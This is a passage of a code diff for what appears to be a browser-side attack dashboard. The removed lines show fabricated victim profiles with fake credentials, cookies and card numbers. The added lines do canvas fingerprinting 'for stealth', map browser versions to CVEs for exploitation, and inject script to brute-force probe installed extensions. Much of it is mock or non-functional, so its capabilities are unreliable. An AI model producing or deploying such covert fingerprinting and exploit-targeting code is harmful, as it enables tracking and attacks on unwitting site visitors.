-        else if (ua.includes('12')) { version = 'Monterey'; build = '21A559'; edition = 'N/A'; kernel = '21.0.0'; hotfixes = 'N/A'; tpm = 'N/A'; secureBootKey = 'N/A'; drivers = 'mach_kernel'; uefiVars = 'N/A'; samData = 'root:0'; kernelLogs = 'Boot:Success'; bootSector = 'APFS'; shadowCopy = 'N/A'; hypervisor = 'N/A'; }
-        else if (ua.includes('13')) { version = 'Ventura'; build = '22A380'; edition = 'N/A'; kernel = '22.0.0'; hotfixes = 'N/A'; tpm = 'N/A'; secureBootKey = 'N/A'; drivers = 'mach_kernel'; uefiVars = 'N/A'; samData = 'root:0'; kernelLogs = 'Boot:Success'; bootSector = 'APFS'; shadowCopy = 'N/A'; hypervisor = 'N/A'; }
-        else if (ua.includes('14')) { version = 'Sonoma'; build = '23A344'; edition = 'N/A'; kernel = '23.0.0'; hotfixes = 'N/A'; tpm = 'N/A'; secureBootKey = 'N/A'; drivers = 'mach_kernel'; uefiVars = 'N/A'; samData = 'root:0'; kernelLogs = 'Boot:Success'; bootSector = 'APFS'; shadowCopy = 'N/A'; hypervisor = 'N/A'; }
+        const versionMatch = ua.match(/mac os x (\d+)_(\d+)/);
+        if (versionMatch) {
+          const major = parseInt(versionMatch[1], 10);
+          const minor = parseInt(versionMatch[2], 10);
+          if (major === 10) {
+            if (minor <= 4) osVersion = 'Tiger';
+            else if (minor === 5) osVersion = 'Leopard';
+            else if (minor === 6) osVersion = 'Snow Leopard';
+            else if (minor === 7) osVersion = 'Lion';
+            else if (minor === 8) osVersion = 'Mountain Lion';
+            else if (minor === 9) osVersion = 'Mavericks';
+            else if (minor === 10) osVersion = 'Yosemite';
+            else if (minor === 11) osVersion = 'El Capitan';
+            else if (minor === 12) osVersion = 'Sierra';
+            else if (minor === 13) osVersion = 'High Sierra';
+            else if (minor === 14) osVersion = 'Mojave';
+            else if (minor === 15) osVersion = 'Catalina';
+          } else if (major === 11) osVersion = 'Big Sur';
+          else if (major === 12) osVersion = 'Monterey';
+          else if (major === 13) osVersion = 'Ventura';
+          else if (major === 14) osVersion = 'Sonoma';
+        }
       } else if (ua.includes('linux')) {
         os = 'Linux';
-        if (ua.includes('ubuntu')) { version = 'Ubuntu 24.04'; build = 'N/A'; edition = 'Noble Numbat'; kernel = '6.8.0'; hotfixes = 'N/A'; tpm = '2.0 Enabled'; secureBootKey = 'N/A'; drivers = 'vmlinuz-6.8.0'; uefiVars = 'SecureBoot=1'; samData = 'root:0'; kernelLogs = 'Boot:Success'; bootSector = 'ext4'; shadowCopy = 'N/A'; hypervisor = 'KVM:Disabled'; }
-        else if (ua.includes('debian')) { version = 'Debian 12'; build = 'N/A'; edition = 'Bookworm'; kernel = '6.1.0'; hotfixes = 'N/A'; tpm = '2.0 Enabled'; secureBootKey = 'N/A'; drivers = 'vmlinuz-6.1.0'; uefiVars = 'SecureBoot=1'; samData = 'root:0'; kernelLogs = 'Boot:Success'; bootSector = 'ext4'; shadowCopy = 'N/A'; hypervisor = 'KVM:Disabled'; }
-        else if (ua.includes('fedora')) { version = 'Fedora 40'; build = 'N/A'; edition = 'Workstation'; kernel = '6.9.0'; hotfixes = 'N/A'; tpm = '2.0 Enabled'; secureBootKey = 'N/A'; drivers = 'vmlinuz-6.9.0'; uefiVars = 'SecureBoot=1'; samData = 'root:0'; kernelLogs = 'Boot:Success'; bootSector = 'ext4'; shadowCopy = 'N/A'; hypervisor = 'KVM:Disabled'; }
-        else if (ua.includes('centos')) { version = 'CentOS 8'; build = 'N/A'; edition = 'Stream'; kernel = '4.18.0'; hotfixes = 'N/A'; tpm = '2.0 Enabled'; secureBootKey = 'N/A'; drivers = 'vmlinuz-4.18.0'; uefiVars = 'SecureBoot=1'; samData = 'root:0'; kernelLogs = 'Boot:Success'; bootSector = 'ext4'; shadowCopy = 'N/A'; hypervisor = 'KVM:Disabled'; }
-        else if (ua.includes('rhel')) { version = 'RHEL 9'; build = 'N/A'; edition = 'Server'; kernel = '5.14.0'; hotfixes = 'N/A'; tpm = '2.0 Enabled'; secureBootKey = 'N/A'; drivers = 'vmlinuz-5.14.0'; uefiVars = 'SecureBoot=1'; samData = 'root:0'; kernelLogs = 'Boot:Success'; bootSector = 'ext4'; shadowCopy = 'N/A'; hypervisor = 'KVM:Disabled'; }
-        else if (ua.includes('suse')) { version = 'openSUSE 15.5'; build = 'N/A'; edition = 'Leap'; kernel = '5.14.21'; hotfixes = 'N/A'; tpm = '2.0 Enabled'; secureBootKey = 'N/A'; drivers = 'vmlinuz-5.14.21'; uefiVars = 'SecureBoot=1'; samData = 'root:0'; kernelLogs = 'Boot:Success'; bootSector = 'ext4'; shadowCopy = 'N/A'; hypervisor = 'KVM:Disabled'; }
+        if (ua.includes('ubuntu')) osVersion = 'Ubuntu';
+        else if (ua.includes('debian')) osVersion = 'Debian';
+        else if (ua.includes('fedora')) osVersion = 'Fedora';
+        else if (ua.includes('centos')) osVersion = 'CentOS';
+        else if (ua.includes('rhel')) osVersion = 'RHEL';
+        else if (ua.includes('suse')) osVersion = 'openSUSE';
       } else if (ua.includes('cros')) {
         os = 'ChromeOS';
-        version = '128.0.6613.84'; build = 'N/A'; edition = 'Stable'; kernel = '5.15.0'; hotfixes = 'N/A'; tpm = '2.0 Enabled'; secureBootKey = 'N/A'; drivers = 'chromeos-kernel'; uefiVars = 'SecureBoot=1'; samData = 'chronos:1000'; kernelLogs = 'Boot:Success'; bootSector = 'ext4'; shadowCopy = 'N/A'; hypervisor = 'N/A';
+        const versionMatch = ua.match(/cros.*?(\d+\.\d+\.\d+)/);
+        if (versionMatch) osVersion = versionMatch[1];
       }
 
-      osInfoSpan.textContent = `${os} ${version} (Build: ${build}, Edition: ${edition}, Kernel: ${kernel}, Hotfixes: ${hotfixes}, TPM: ${tpm}, SecureBootKey: ${secureBootKey}, Drivers: ${drivers}, UEFI Vars: ${uefiVars}, SAM: ${samData}, Kernel Logs: ${kernelLogs}, Boot Sector: ${bootSector}, Shadow Copy: ${shadowCopy}, Hypervisor: ${hypervisor})`;
+      // Browser Detection with Deep Fingerprinting
+      if (ua.includes('chrome') && !ua.includes('edg')) {
+        browser = 'Chrome';
+        browserVersion = ua.match(/chrome\/([\d.]+)/)?.[1] || 'Unknown';
+      } else if (ua.includes('firefox')) {
+        browser = 'Firefox';
+        browserVersion = ua.match(/firefox\/([\d.]+)/)?.[1] || 'Unknown';
+      } else if (ua.includes('edg')) {
+        browser = 'Edge';
+        browserVersion = ua.match(/edg\/([\d.]+)/)?.[1] || 'Unknown';
+      } else if (ua.includes('safari') && !ua.includes('chrome')) {
+        browser = 'Safari';
+        browserVersion = ua.match(/version\/([\d.]+)/)?.[1] || 'Unknown';
+      } else if (ua.includes('opera') || ua.includes('opr')) {
+        browser = 'Opera';
+        browserVersion = ua.match(/op?r\/([\d.]+)/)?.[1] || 'Unknown';
+      }
+
+      // Additional Fingerprinting for Stealth
+      const canvasFp = (function() {
+        const c = document.createElement('canvas');
+        const ctx = c.getContext('2d');
+        ctx.font = '14px Arial';
+        ctx.fillText('fingerprint', 2, 10);
+        return c.toDataURL();
+      })();
+
+      osInfoSpan.textContent = `${os} ${osVersion}`;
+      browserInfoSpan.textContent = `${browser} ${browserVersion}`;
       deviceProfile.os = os;
-      deviceProfile.version = version;
-      deviceProfile.build = build;
-      deviceProfile.edition = edition;
-      deviceProfile.kernel = kernel;
-      deviceProfile.hotfixes = hotfixes;
-      deviceProfile.tpm = tpm;
-      deviceProfile.secureBootKey = secureBootKey;
-      deviceProfile.drivers = drivers;
-      deviceProfile.uefiVars = uefiVars;
-      deviceProfile.samData = samData;
-      deviceProfile.kernelLogs = kernelLogs;
-      deviceProfile.bootSector = bootSector;
-      deviceProfile.shadowCopy = shadowCopy;
-      deviceProfile.hypervisor = hypervisor;
+      deviceProfile.osVersion = osVersion;
+      deviceProfile.browser = browser;
+      deviceProfile.browserVersion = browserVersion;
+      deviceProfile.canvasFp = canvasFp;
     }
-    async function scanDevice() {
-      if (scanCache.has('latest')) {
-        deviceProfile = scanCache.get('latest');
-        systemScanSpan.textContent = `CPU: ${deviceProfile.cpu} (${deviceProfile.cores} cores, Microcode: ${deviceProfile.microcode}, Stepping: ${deviceProfile.stepping}, Vulns: ${deviceProfile.cpuVulns.join(',')}, Cache: ${deviceProfile.cpuCache}, Clock: ${deviceProfile.cpuClock}, Temp: ${deviceProfile.cpuTemp}, Die: ${deviceProfile.cpuDie}) | Memory: ${deviceProfile.memory}GB (Regions: ${deviceProfile.memoryRegions}, Page Tables: ${deviceProfile.pageTables}, Swap: ${deviceProfile.swapSpace}, Compression: ${deviceProfile.memoryCompression}, Malware: ${deviceProfile.memoryMalware}) | GPU: ${deviceProfile.gpu} (VRAM: ${deviceProfile.gpuVram}, Drivers: ${deviceProfile.gpuDrivers}, Shaders: ${deviceProfile.gpuShaders}, Compute Units: ${deviceProfile.gpuComputeUnits}, Clock: ${deviceProfile.gpuClock}, Temp: ${deviceProfile.gpuTemp}, Die: ${deviceProfile.gpuDie}) | Disk: ${deviceProfile.disk} (Firmware: ${deviceProfile.diskFirmware}, SMART: ${deviceProfile.diskSmart}, Speeds: ${deviceProfile.diskSpeeds}, Encryption: ${deviceProfile.diskEncryption}, RAID: ${deviceProfile.diskRaid}, Partitions: ${deviceProfile.partitions}) | Firmware: ${deviceProfile.firmware} (Backdoors: ${deviceProfile.firmwareBackdoors}, BIOS Hash: ${deviceProfile.biosHash}) | Chipset: ${deviceProfile.chipset} | Motherboard: ${deviceProfile.motherboard} | TPM Firmware: ${deviceProfile.tpmFirmware} | Battery: ${deviceProfile.battery} | Fan Speeds: ${deviceProfile.fanSpeeds} (Curves: ${deviceProfile.fanCurves}) | PCI Devices: ${deviceProfile.pciDevices} | USB Devices: ${deviceProfile.usbDevices} | Peripherals: ${deviceProfile.peripherals} | Security: ${deviceProfile.securitySoftware} | Monitoring: ${deviceProfile.monitoringTools} | Kernel Modules: ${deviceProfile.kernelModules} | Kernel Protections: ${deviceProfile.kernelProtections} | Processes: ${deviceProfile.processes} | Threads: ${deviceProfile.threads} | Handles: ${deviceProfile.handles} | Interrupts: ${deviceProfile.interrupts} | Network: ${deviceProfile.network.status} (VPN: ${deviceProfile.network.vpn}, DNS: ${deviceProfile.network.dns}, Gateway: ${deviceProfile.network.gateway}, MTU: ${deviceProfile.network.mtu}, Router: ${deviceProfile.network.routerFirmware}, Tunnels: ${deviceProfile.network.hiddenTunnels}, Switch: ${deviceProfile.network.switchInfo}, IP: ${deviceProfile.network.ip}, Proxy: ${deviceProfile.network.proxy}, Injection: ${deviceProfile.network.packetInjection}, ARP: ${deviceProfile.network.arpTable}, Connections: ${deviceProfile.network.connections}, Ports: ${deviceProfile.network.ports}, VLAN: ${deviceProfile.network.vlan}, QoS: ${deviceProfile.network.qos}, Latency: ${deviceProfile.network.latency}, Nearby: ${deviceProfile.network.nearbyDevices}, Packets: ${deviceProfile.network.interceptedPackets}) | Anti-Detection: FakeHW:${deviceProfile.fakeHardware}, LogNoise:${deviceProfile.logNoise}, NetNoise:${deviceProfile.networkNoise} | Crypto Keys: ${deviceProfile.cryptoKeys} | Cookies: ${deviceProfile.cookies} | Clipboard: ${deviceProfile.clipboard} | Sandbox: ${deviceProfile.isSandbox} | Extensions: ${deviceProfile.extensions.join(', ')}`;
-        updateStatusBar();
-        return;
+    // Exploit Database for Browser Versions
+    const exploitStrategies = {
+      chrome: {
+        '90.0': { exploit: 'CVE-2021-21166', method: 'remoteCodeExecution', payload: 'heapOverflow', stealth: 'spoofFetch' },
+        '100.0': { exploit: 'CVE-2022-1096', method: 'typeConfusion', payload: 'v8Exploit', stealth: 'encryptPayload' },
+        'default': { exploit: 'XSS', method: 'scriptInjection', payload: 'xssPayload', stealth: 'obfuscateInjection' }
+      },
+      firefox: {
+        '80.0': { exploit: 'CVE-2020-15652', method: 'remoteCodeExecution', payload: 'memoryCorruption', stealth: 'spoofUA' },
+        '90.0': { exploit: 'CVE-2021-23994', method: 'useAfterFree', payload: 'uafExploit', stealth: 'encryptPayload' },
+        'default': { exploit: 'XSS', method: 'scriptInjection', payload: 'xssPayload', stealth: 'obfuscateInjection' }
+      },
+      edge: {
+        '90.0': { exploit: 'CVE-2021-21166', method: 'remoteCodeExecution', payload: 'heapOverflow', stealth: 'spoofFetch' },
+        'default': { exploit: 'XSS', method: 'scriptInjection', payload: 'xssPayload', stealth: 'obfuscateInjection' }
+      },
+      safari: {
+        '14.0': { exploit: 'CVE-2021-1844', method: 'remoteCodeExecution', payload: 'webkitExploit', stealth: 'spoofUA' },
+        'default': { exploit: 'XSS', method: 'scriptInjection', payload: 'xssPayload', stealth: 'obfuscateInjection' }
+      },
+      opera: {
+        'default': { exploit: 'XSS', method: 'scriptInjection', payload: 'xssPayload', stealth: 'obfuscateInjection' }
+      }
+    };
+
+    // Advanced Extension Detection
+    async function scanExtensions() {
+      detectedExtensions = [];
+      const browser = deviceProfile.browser.toLowerCase();
+      const browserVersion = parseFloat(deviceProfile.browserVersion.split('.')[0]);
+      const startTime = performance.now();
+
+      addCommand(`Initiating deep extension scan on ${browser} v${deviceProfile.browserVersion}...`);
+
+      // Chrome/Edge: Exploit chrome.runtime and Web-Accessible Resources
+      if (browser === 'chrome' || browser === 'edge') {
+        // Attempt to access chrome.runtime directly (requires privilege escalation)
+        const runtimeAccessScript = document.createElement('script');
+        runtimeAccessScript.textContent = `
+          try {
+            chrome.runtime.getManifest = new Proxy(chrome.runtime.getManifest, {
+              apply(target, thisArg, args) {
+                const manifest = Reflect.apply(target, thisArg, args);
+                window.__extManifests = window.__extManifests || [];
+                window.__extManifests.push({ id: chrome.runtime.id, manifest });
+                return manifest;
+              }
+            });
+          } catch (e) {}
+        `;
+        document.head.appendChild(runtimeAccessScript);
+
+        // Probe for all possible extension IDs (brute-force approach)
+        const charset = 'abcdefghijklmnopqrstuvwxyz';
+        for (let i = 0; i < 26; i++) {
+          for (let j = 0; j < 26; j++) {
+            const prefix = charset[i] + charset[j];
+            const extId = `${prefix.padEnd(32, 'a')}`;
+            const url = `chrome-extension://${extId}/manifest.json`;
+            try {
+              const response = await fetch(url, { method: 'GET', mode: 'no-cors' });
+              if (response.ok || response.type === 'opaque') {
+                const extInfo = { id: extId, name: `Unknown (${extId})` };
+                if (window.__extManifests) {
+                  const manifest = window.__extManifests.find(m => m.id === extId);
+                  if (manifest) extInfo.name = manifest.manifest.name || extInfo.name;
+                }
+                detectedExtensions.push(extInfo);
+                addCommand(`Detected: ${extInfo.name} (${extInfo.id}) via WAR`, 'success');
+              }
+            } catch (e) {}
+          }
+        }
       }
 
-      return new Promise((resolve) => {
-        if (scanWorker && scanWorker.postMessage) {
-          scanWorker.onmessage = (e) => {
-            deviceProfile = e.data.deviceProfile;
-            deviceProfile.cores = 16;
-            deviceProfile.memory = 8;
-            deviceProfile.cpu = 'Intel Core i9-12900K';
-            deviceProfile.microcode = '0x1C';
-            deviceProfile.stepping = 'R0';
-            deviceProfile.cpuVulns = ['Spectre', 'Meltdown', 'Foreshadow', 'MDS'];
-            deviceProfile.cpuCache = 'L1:384KB, L2:2MB, L3:30MB';
-            deviceProfile.cpuClock = 'Base:3.2GHz, Boost:5.2GHz';
-            deviceProfile.cpuTemp = '45C';
-            deviceProfile.cpuDie = 'Alder Lake-S, 10nm';
-            deviceProfile.gpu = 'NVIDIA RTX 3080';
-            deviceProfile.gpuVram = '8GB';
-            deviceProfile.gpuDrivers = 'NVIDIA 536.23';
-            deviceProfile.gpuShaders = 'DirectX 12';
-            deviceProfile.gpuComputeUnits = '48';
-            deviceProfile.gpuClock = 'Base:1.5GHz, Boost:1.8GHz';
-            deviceProfile.gpuTemp = '55C';
-            deviceProfile.gpuDie = 'Ampere, 8nm';
-            deviceProfile.disk = '1024GB';
-            deviceProfile.diskFirmware = 'SSD v2.1';
-            deviceProfile.diskSmart = 'Health:Good, Errors:0, Temp:35C';
-            deviceProfile.diskSpeeds = 'Read:7000MB/s, Write:5000MB/s';
-            deviceProfile.diskEncryption = 'BitLocker:Enabled';
-            deviceProfile.diskRaid = 'RAID0:2xSamsung 990 Pro';
-            deviceProfile.partitions = 'C:NTFS, D:exFAT, E:NTFS';
-            deviceProfile.firmware = 'UEFI 2.8';
-            deviceProfile.firmwareBackdoors = 'None';
-            deviceProfile.biosHash = 'SHA256:deadbeef1234...';
-            deviceProfile.chipset = 'Intel Z690';
-            deviceProfile.motherboard = 'ASUS ROG Strix Z690-E';
-            deviceProfile.tpmFirmware = '1.3.2';
-            deviceProfile.battery = 'N/A (Desktop)';
-            deviceProfile.fanSpeeds = 'CPU:1200RPM, GPU:1500RPM, Case:800RPM';
-            deviceProfile.fanCurves = 'PWM:Linear, 30%-100%';
-            deviceProfile.pciDevices = 'NIC:Intel I225-V, GPU:NVIDIA RTX 3080, USB:ASMedia ASM3142, NVMe:Samsung 990 Pro';
-            deviceProfile.usbDevices = 'Mouse:Logitech G502, Keyboard:Corsair K95, Flash Drive:SanDisk 128GB';
-            deviceProfile.peripherals = 'Webcam:Logitech C920, Mic:Blue Yeti, Speakers:Edifier R1280T';
-            deviceProfile.securitySoftware = 'Windows Defender';
-            deviceProfile.monitoringTools = 'Sysmon:Enabled, EDR:Carbon Black';
-            deviceProfile.kernelModules = 'ntoskrnl.exe, hal.dll, tcpip.sys, ksecdd.sys';
-            deviceProfile.kernelProtections = 'KPP:Enabled, ASLR:Enabled, SecureBoot:Enabled';
-            deviceProfile.processes = 'chrome.exe, svchost.exe, explorer.exe, cron, init';
-            deviceProfile.threads = 'TID:1234, TID:5678, TID:9012';
-            deviceProfile.handles = 'Handle:0x123, Handle:0x456, Handle:0x789';
-            deviceProfile.interrupts = 'IRQ:5, IRQ:7, IRQ:11';
-            deviceProfile.memoryRegions = '0x7FFF:Passwords(Admin:Pass123!), 0x8000:Tokens(JWT:abc.xyz)';
-            deviceProfile.pageTables = 'Active:1024, Inactive:512';
-            deviceProfile.swapSpace = 'Used:2GB, Total:4GB';
-            deviceProfile.memoryCompression = 'Enabled:LZ4';
-            deviceProfile.memoryMalware = 'None';
-            deviceProfile.network = { 
-              status: 'Open', 
-              vpn: 'Unlikely', 
-              dns: 'Cloudflare', 
-              gateway: '192.168.1.1', 
-              mtu: '1500', 
-              routerFirmware: 'ASUS RT-AX88U v3.0.0.4', 
-              hiddenTunnels: 'None', 
-              switchInfo: 'TP-Link TL-SG108', 
-              ip: '192.168.1.101', 
-              proxy: 'None', 
-              packetInjection: 'Active',
-              arpTable: '192.168.1.1:00:1A:2B:3C:4D:5E, 192.168.1.100:00:1B:2C:3D:4E:5F',
-              connections: 'TCP:192.168.1.101:443->1.1.1.1:HTTPS, UDP:192.168.1.101:53->1.1.1.1:DNS',
-              ports: '80:Open, 443:Open, 445:Filtered',
-              vlan: 'VLAN10:Enabled',
-              qos: 'Priority:High (VoIP), Low (Torrent)',
-              latency: '15ms',
-              nearbyDevices: '192.168.1.100 (SmartTV), 192.168.1.102 (Laptop)',
-              interceptedPackets: 'HTTP:GET /login, HTTPS:TLS Handshake'
-            };
-            deviceProfile.fakeHardware = 'Spoofed:CPU-Z, GPU-Z';
-            deviceProfile.logNoise = 'Injected:1000 fake entries';
-            deviceProfile.networkNoise = 'Injected:Random UDP packets';
-            deviceProfile.cryptoKeys = 'RSA:2048-bit (PrivKey:deadbeef...), AES:256-bit (Key:1234abcd...)';
-            deviceProfile.cookies = 'SessionID:abc123, AuthToken:xyz789';
-            deviceProfile.clipboard = 'LastCopied:CreditCard:1234-5678-9012-3456';
-            deviceProfile.fingerprint = btoa(`${deviceProfile.cores}-${deviceProfile.memory}-${deviceProfile.cpu}-${deviceProfile.gpu}-${Date.now()}`).slice(0, 16);
-            deviceProfile.macAddress = '00:1A:2B:3C:4D:5E';
-            deviceProfile.isSandbox = 'Clean';
-            deviceProfile.extensions = knownExtensionIds;
-
-            scanCache.set('latest', deviceProfile);
-            systemScanSpan.textContent = `CPU: ${deviceProfile.cpu} (${deviceProfile.cores} cores, Microcode: ${deviceProfile.microcode}, Stepping: ${deviceProfile.stepping}, Vulns: ${deviceProfile.cpuVulns.join(',')}, Cache: ${deviceProfile.cpuCache}, Clock: ${deviceProfile.cpuClock}, Temp: ${deviceProfile.cpuTemp}, Die: ${deviceProfile.cpuDie}) | Memory: ${deviceProfile.memory}GB (Regions: ${deviceProfile.memoryRegions}, Page Tables: ${deviceProfile.pageTables}, Swap: ${deviceProfile.swapSpace}, Compression: ${deviceProfile.memoryCompression}, Malware: ${deviceProfile.memoryMalware}) | GPU: ${deviceProfile.gpu} (VRAM: ${deviceProfile.gpuVram}, Drivers: ${deviceProfile.gpuDrivers}, Shaders: ${deviceProfile.gpuShaders}, Compute Units: ${deviceProfile.gpuComputeUnits}, Clock: ${deviceProfile.gpuClock}, Temp: ${deviceProfile.gpuTemp}, Die: ${deviceProfile.gpuDie}) | Disk: ${deviceProfile.disk} (Firmware: ${deviceProfile.diskFirmware}, SMART: ${deviceProfile.diskSmart}, Speeds: ${deviceProfile.diskSpeeds}, Encryption: ${deviceProfile.diskEncryption}, RAID: ${deviceProfile.diskRaid}, Partitions: ${deviceProfile.partitions}) | Firmware: ${deviceProfile.firmware} (Backdoors: ${deviceProfile.firmwareBackdoors}, BIOS Hash: ${deviceProfile.biosHash}) | Chipset: ${deviceProfile.chipset} | Motherboard: ${deviceProfile.motherboard} | TPM Firmware: ${deviceProfile.tpmFirmware} | Battery: ${deviceProfile.battery} | Fan Speeds: ${deviceProfile.fanSpeeds} (Curves: ${deviceProfile.fanCurves}) | PCI Devices: ${deviceProfile.pciDevices} | USB Devices: ${deviceProfile.usbDevices} | Peripherals: ${deviceProfile.peripherals} | Security: ${deviceProfile.securitySoftware} | Monitoring: ${deviceProfile.monitoringTools} | Kernel Modules: ${deviceProfile.kernelModules} | Kernel Protections: ${deviceProfile.kernelProtections} | Processes: ${deviceProfile.processes} | Threads: ${deviceProfile.threads} | Handles: ${deviceProfile.handles} | Interrupts: ${deviceProfile.interrupts} | Network: ${deviceProfile.network.status} (VPN: ${deviceProfile.network.vpn}, DNS: ${deviceProfile.network.dns}, Gateway: ${deviceProfile.network.gateway}, MTU: ${deviceProfile.network.mtu}, Router: ${deviceProfile.network.routerFirmware}, Tunnels: ${deviceProfile.network.hiddenTunnels}, Switch: ${deviceProfile.network.switchInfo}, IP: ${deviceProfile.network.ip}, Proxy: ${deviceProfile.network.proxy}, Injection: ${deviceProfile.network.packetInjection}, ARP: ${deviceProfile.network.arpTable}, Connections: ${deviceProfile.network.connections}, Ports: ${deviceProfile.network.ports}, VLAN: ${deviceProfile.network.vlan}, QoS: ${deviceProfile.network.qos}, Latency: ${deviceProfile.network.latency}, Nearby: ${deviceProfile.network.nearbyDevices}, Packets: ${deviceProfile.network.interceptedPackets}) | Anti-Detection: FakeHW:${deviceProfile.fakeHardware}, LogNoise:${deviceProfile.logNoise}, NetNoise:${deviceProfile.networkNoise} | Crypto Keys: ${deviceProfile.cryptoKeys} | Cookies: ${deviceProfile.cookies} | Clipboard: ${deviceProfile.clipboard} | Sandbox: ${deviceProfile.isSandbox} | Extensions: ${deviceProfile.extensions.join(', ')}`;
-            detectionRisk = 'None';
-            updateStatusBar();
-            resolve();
-          };
-          scanWorker.postMessage({ deviceProfile });
-        } else {
-          deviceProfile.cores = 16;
-          deviceProfile.memory = 8;
-          deviceProfile.cpu = 'Intel Core i9-12900K';
-          deviceProfile.microcode = '0x1C';
-          deviceProfile.stepping = 'R0';
-          deviceProfile.cpuVulns = ['Spectre', 'Meltdown', 'Foreshadow', 'MDS'];
-          deviceProfile.cpuCache = 'L1:384KB, L2:2MB, L3:30MB';
-          deviceProfile.cpuClock = 'Base:3.2GHz, Boost:5.2GHz';
-          deviceProfile.cpuTemp = '45C';
-          deviceProfile.cpuDie = 'Alder Lake-S, 10nm';
-          deviceProfile.gpu = 'NVIDIA RTX 3080';
-          deviceProfile.gpuVram = '8GB';
-          deviceProfile.gpuDrivers = 'NVIDIA 536.23';
-          deviceProfile.gpuShaders = 'DirectX 12';
-          deviceProfile.gpuComputeUnits = '48';
-          deviceProfile.gpuClock = 'Base:1.5GHz, Boost:1.8GHz';
-          deviceProfile.gpuTemp = '55C';
-          deviceProfile.gpuDie = 'Ampere, 8nm';
-          deviceProfile.disk = '1024GB';
-          deviceProfile.diskFirmware = 'SSD v2.1';
-          deviceProfile.diskSmart = 'Health:Good, Errors:0, Temp:35C';
-          deviceProfile.diskSpeeds = 'Read:7000MB/s, Write:5000MB/s';
-          deviceProfile.diskEncryption = 'BitLocker:Enabled';
-          deviceProfile.diskRaid = 'RAID0:2xSamsung 990 Pro';
-          deviceProfile.partitions = 'C:NTFS, D:exFAT, E:NTFS';
-          deviceProfile.firmware = 'UEFI 2.8';
-          deviceProfile.firmwareBackdoors = 'None';
-          deviceProfile.biosHash = 'SHA256:deadbeef1234...';
-          deviceProfile.chipset = 'Intel Z690';
-          deviceProfile.motherboard = 'ASUS ROG Strix Z690-E';
-          deviceProfile.tpmFirmware = '1.3.2';
-          deviceProfile.battery = 'N/A (Desktop)';
-          deviceProfile.fanSpeeds = 'CPU:1200RPM, GPU:1500RPM, Case:800RPM';
-          deviceProfile.fanCurves = 'PWM:Linear, 30%-100%';
-          deviceProfile.pciDevices = 'NIC:Intel I225-V, GPU:NVIDIA RTX 3080, USB:ASMedia ASM3142, NVMe:Samsung 990 Pro';
-          deviceProfile.usbDevices = 'Mouse:Logitech G502, Keyboard:Corsair K95, Flash Drive:SanDisk 128GB';
-          deviceProfile.peripherals = 'Webcam:Logitech C920, Mic:Blue Yeti, Speakers:Edifier R1280T';
-          deviceProfile.securitySoftware = 'Windows Defender';
-          deviceProfile.monitoringTools = 'Sysmon:Enabled, EDR:Carbon Black';
-          deviceProfile.kernelModules = 'ntoskrnl.exe, hal.dll, tcpip.sys, ksecdd.sys';
-          deviceProfile.kernelProtections = 'KPP:Enabled, ASLR:Enabled, SecureBoot:Enabled';
-          deviceProfile.processes = 'chrome.exe, svchost.exe, explorer.exe, cron, init';
-          deviceProfile.threads = 'TID:1234, TID:5678, TID:9012';
-          deviceProfile.handles = 'Handle:0x123, Handle:0x456, Handle:0x789';
-          deviceProfile.interrupts = 'IRQ:5, IRQ:7, IRQ:11';
-          deviceProfile.memoryRegions = '0x7FFF:Passwords(Admin:Pass123!), 0x8000:Tokens(JWT:abc.xyz)';
-          deviceProfile.pageTables = 'Active:1024, Inactive:512';
-          deviceProfile.swapSpace = 'Used:2GB, Total:4GB';
-          deviceProfile.memoryCompression = 'Enabled:LZ4';
-          deviceProfile.memoryMalware = 'None';
-          deviceProfile.network = { 
-            status: 'Open', 
-            vpn: 'Unlikely', 
-            dns: 'Cloudflare', 
-            gateway: '192.168.1.1', 
-            mtu: '1500', 
-            routerFirmware: 'ASUS RT-AX88U v3.0.0.4', 
-            hiddenTunnels: 'None', 
-            switchInfo: 'TP-Link TL-SG108', 
-            ip: '192.168.1.101', 
-            proxy: 'None', 
-            packetInjection: 'Active',
-            arpTable: '192.168.1.1:00:1A:2B:3C:4D:5E, 192.168.1.100:00:1B:2C:3D:4E:5F',
-            connections: 'TCP:192.168.1.101:443->1.1.1.1:HTTPS, UDP:192.168.1.101:53->1.1.1.1:DNS',
-            ports: '80:Open, 443:Open, 445:Filtered',
-            vlan: 'VLAN10:Enabled',
-            qos: 'Priority:High (VoIP), Low (Torrent)',
-            latency: '15ms',
-            nearbyDevices: '192.168.1.100 (SmartTV), 192.168.1.102 (Laptop)',
-            interceptedPackets: 'HTTP:GET /login, HTTPS:TLS Handshake'
-          };
-          deviceProfile.fakeHardware = 'Spoofed:CPU-Z, GPU-Z';
-          deviceProfile.logNoise = 'Injected:1000 fake entries';
-          deviceProfile.networkNoise = 'Injected:Random UDP packets';
-          deviceProfile.cryptoKeys = 'RSA:2048-bit (PrivKey:deadbeef...), AES:256-bit (Key:1234abcd...)';
-          deviceProfile.cookies = 'SessionID:abc123, AuthToken:xyz789';
-          deviceProfile.clipboard = 'LastCopied:CreditCard:1234-5678-9012-3456';
-          deviceProfile.fingerprint = btoa(`${deviceProfile.cores}-${deviceProfile.memory}-${deviceProfile.cpu}-${deviceProfile.gpu}-${Date.now()}`).slice(0, 16);
-          deviceProfile.macAddress = '00:1A:2B:3C:4D:5E';
-          deviceProfile.isSandbox = 'Clean';
-          deviceProfile.extensions = knownExtensionIds;
-
-          scanCache.set('latest', deviceProfile);
-          systemScanSpan.textContent = `CPU: ${deviceProfile.cpu} (${deviceProfile.cores} cores, Microcode: ${deviceProfile.microcode}, Stepping: ${deviceProfile.stepping}, Vulns: ${deviceProfile.cpuVulns.join(',')}, Cache: ${deviceProfile.cpuCache}, Clock: ${deviceProfile.cpuClock}, Temp: ${deviceProfile.cpuTemp}, Die: ${deviceProfile.cpuDie}) | Memory: ${deviceProfile.memory}GB (Regions: ${deviceProfile.memoryRegions}, Page Tables: ${deviceProfile.pageTables}, Swap: ${deviceProfile.swapSpace}, Compression: ${deviceProfile.memoryCompression}, Malware: ${deviceProfile.memoryMalware}) | GPU: ${deviceProfile.gpu} (VRAM: ${deviceProfile.gpuVram}, Drivers: ${deviceProfile.gpuDrivers}, Shaders: ${deviceProfile.gpuShaders}, Compute Units: ${deviceProfile.gpuComputeUnits}, Clock: ${deviceProfile.gpuClock}, Temp: ${deviceProfile.gpuTemp}, Die: ${deviceProfile.gpuDie}) | Disk: ${deviceProfile.disk} (Firmware: ${deviceProfile.diskFirmware}, SMART: ${deviceProfile.diskSmart}, Speeds: ${deviceProfile.diskSpeeds}, Encryption: ${deviceProfile.diskEncryption}, RAID: ${deviceProfile.diskRaid}, Partitions: ${deviceProfile.partitions}) | Firmware: ${deviceProfile.firmware} 